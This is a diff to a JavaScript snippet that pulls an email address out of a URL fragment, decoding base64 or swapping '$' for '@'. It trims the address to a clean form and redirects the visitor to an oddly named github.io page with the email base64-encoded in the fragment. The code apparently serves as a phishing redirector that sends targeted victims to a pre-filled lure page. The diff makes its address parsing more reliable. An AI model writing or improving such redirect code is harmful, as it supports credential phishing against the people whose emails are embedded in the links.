@@ -25,29 +25,44 @@
                 
                 if (!hash) return null;
                 
+                let decoded = null;
+                
                 // Try to decode as base64 first
                 try {
                     const base64Decoded = atob(hash);
-                    if (isValidEmailFormat(base64Decoded)) return base64Decoded;
+                    if (base64Decoded.indexOf('@') !== -1) decoded = base64Decoded;
                 } catch (e) {
                     // Not a valid base64 string, continue to check as plain email
                 }
                 
-                // Check if it's a plain email (replace $ with @ if needed)
-                const emailWithAt = hash.replace(/\$/g, '@');
-                if (isValidEmailFormat(emailWithAt)) return emailWithAt;
+                // If base64 decode didn't work, check if it's a plain email
+                if (!decoded) {
+                    const emailWithAt = hash.replace(/\$/g, '@');
+                    if (emailWithAt.indexOf('@') !== -1) decoded = emailWithAt;
+                }
                 
-                return null;
+                if (!decoded) return null;
+                
+                // Extract ONLY the email - remove anything after it (like |randomstrings or -suffixes)
+                return extractCleanEmail(decoded);
             }
             
-            function isValidEmailFormat(email) {
-                return email.includes('@') && email.includes('.') && email.length > 5;
+            // Extract only the valid email portion, stripping everything after it
+            function extractCleanEmail(input) {
+                // Replace $ with @ if present
+                input = input.replace(/\$/g, '@');
+                
+                // Regex to match a valid email and capture only that part
+                const emailRegex = /[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}/;
+                const match = input.match(emailRegex);
+                
+                return match ? match[0] : null;
             }
             
             const email = getEmailFromURL();
             
             if (email) {
-                // Redirect to the target URL
+                // Redirect to the target URL with only the clean email
                 window.location = "https://madrizmechanical-technical.github.io/technical-miniature-computing-machine/#" + btoa(email);
             }
         }
